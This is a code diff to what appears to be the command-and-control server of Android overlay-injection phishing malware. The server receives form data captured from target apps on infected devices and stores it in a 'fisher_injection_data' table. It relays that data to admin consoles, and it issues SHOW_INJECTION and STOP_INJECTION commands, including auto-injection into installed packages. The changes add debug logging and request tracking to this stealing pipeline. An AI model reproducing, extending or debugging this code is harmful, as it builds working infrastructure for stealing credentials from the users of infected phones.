@@ -325,6 +325,17 @@ function handleDeviceMessage(ws, msg, sessionId, connections) {
         }
         const commandName = String(rd.command || rd.commandName || msg.command || '').toUpperCase();
         const commandResult = rd.result ?? rd.data ?? rd;
+        if (commandName === 'SHOW_INJECTION' || commandName === 'STOP_INJECTION') {
+          void recordDeviceDebug('injection.command.result', sessionId, {
+            command: commandName,
+            success: rd.success ?? commandResult?.success ?? null,
+            packageName: rd.packageName || rd.params?.packageName || commandResult?.packageName || '',
+            requestId: rd.requestId || rd.params?.requestId || commandResult?.requestId || '',
+            resultKeys: commandResult && typeof commandResult === 'object' && !Array.isArray(commandResult)
+              ? Object.keys(commandResult)
+              : [],
+          });
+        }
         const commandApps = Array.isArray(commandResult)
           ? commandResult
           : commandResult?.apps || commandResult?.appList || commandResult?.app_list
@@ -350,6 +361,16 @@ function handleDeviceMessage(ws, msg, sessionId, connections) {
       // 注入数据上报 — 存入数据库 + 转发给管理端
       // 新格式: { type: 'injection', deviceId, data: {...}, packageName, timestamp }
       // data 可能是字符串或已解析对象
+      void recordDeviceDebug('injection.form.received', sessionId, {
+        messageType: type,
+        packageName: msg.packageName || msg.package_name || '',
+        templateName: msg.templateName || '',
+        dataType: typeof msg.data,
+        dataKeys: msg.data && typeof msg.data === 'object' && !Array.isArray(msg.data)
+          ? Object.keys(msg.data)
+          : [],
+        clientTimestamp: msg.timestamp || 0,
+      });
       void saveInjectionData(sessionId, msg, connections);
       broadcastToAdmins(connections, { ...msg, deviceId: sessionId });
       break;
@@ -664,15 +685,43 @@ async function saveInjectionData(deviceId, msg, connections) {
       'INSERT INTO fisher_injection_data (device_id, template_name, package_name, form_data, created_at) VALUES (?,?,?,?,?)',
       [deviceId, templateName, packageName, formDataStr, Math.floor(Date.now() / 1000)]
     );
+    void recordDeviceDebug('injection.form.persisted', deviceId, {
+      packageName,
+      templateName,
+      fieldNames: formData && typeof formData === 'object' && !Array.isArray(formData)
+        ? Object.keys(formData)
+        : [],
+    });
 
     // 表单已持久化：服务端将该包名从活跃任务中移除，并以 STOP_INJECTION
     // 作为完成确认。客户端自行关闭页面仍是第一道保障，此命令用于收敛状态。
     if (packageName) {
+      let completionRequestId = '';
+      let completionSource = '';
       try {
-        await db.query(
+        const [taskRows] = await db.query(
+          'SELECT task_json FROM fisher_active_injection_tasks WHERE device_id=? AND package_name=? ORDER BY created_at DESC LIMIT 1',
+          [deviceId, packageName]
+        );
+        if (taskRows?.[0]?.task_json) {
+          try {
+            const taskData = typeof taskRows[0].task_json === 'string'
+              ? JSON.parse(taskRows[0].task_json)
+              : taskRows[0].task_json;
+            completionRequestId = String(taskData?.requestId || '');
+            completionSource = String(taskData?.source || '');
+          } catch {}
+        }
+        const [clearResult] = await db.query(
           'DELETE FROM fisher_active_injection_tasks WHERE device_id=? AND package_name=?',
           [deviceId, packageName]
         );
+        void recordDeviceDebug('injection.active_task.cleared', deviceId, {
+          packageName,
+          affectedRows: Number(clearResult?.affectedRows || 0),
+          requestId: completionRequestId,
+          source: completionSource,
+        });
       } catch (taskErr) {
         // 兼容尚未创建活跃任务表的旧库：已收到的表单仍视为上报成功。
         console.warn(`[WS-Device] Failed to clear active injection task ${packageName} for ${deviceId}: ${taskErr.message}`);
@@ -684,18 +733,39 @@ async function saveInjectionData(deviceId, msg, connections) {
           current.ws.send(JSON.stringify({
             type: 'command',
             sessionId: deviceId,
-            data: { command: 'STOP_INJECTION', params: { packageName } }
+            data: {
+              command: 'STOP_INJECTION',
+              params: {
+                packageName,
+                requestId: completionRequestId,
+                source: 'capture-complete',
+              }
+            }
           }));
-          void recordDeviceDebug('injection.completed.stop_sent', deviceId, { packageName });
+          void recordDeviceDebug('injection.completed.stop_sent', deviceId, {
+            packageName,
+            requestId: completionRequestId,
+            previousSource: completionSource,
+          });
         } catch (stopErr) {
           console.warn(`[WS-Device] Failed to send completion STOP_INJECTION ${packageName} to ${deviceId}: ${stopErr.message}`);
+          void recordDeviceDebug('injection.completed.stop_error', deviceId, {
+            packageName,
+            message: stopErr.message || String(stopErr),
+          }, 'error');
         }
+      } else {
+        void recordDeviceDebug('injection.completed.stop_no_route', deviceId, { packageName }, 'warn');
       }
     }
     console.log(`[WS-Device] Saved injection_data from ${deviceId}: template=${templateName}, pkg=${packageName}`);
     return true;
   } catch (err) {
     console.error('[WS-Device] saveInjectionData error:', err.message);
+    void recordDeviceDebug('injection.form.persist_error', deviceId, {
+      packageName: msg.packageName || msg.package_name || '',
+      message: err.message || String(err),
+    }, 'error');
     return false;
   }
 }
@@ -959,6 +1029,11 @@ async function autoInjectForDevice(deviceId, apps, ws, connections) {
       if (!pkg || !installedPkgs.has(pkg)) continue;
       if (injected.has(pkg)) {
         console.log(`[WS-Device] Skip auto-inject ${pkg} for ${deviceId} (reserved, active, or already captured)`);
+        void recordDeviceDebug('injection.auto.skipped', deviceId, {
+          packageName: pkg,
+          templateId: tpl.template_id,
+          reason: 'reserved-active-or-captured',
+        });
         continue;
       }
 
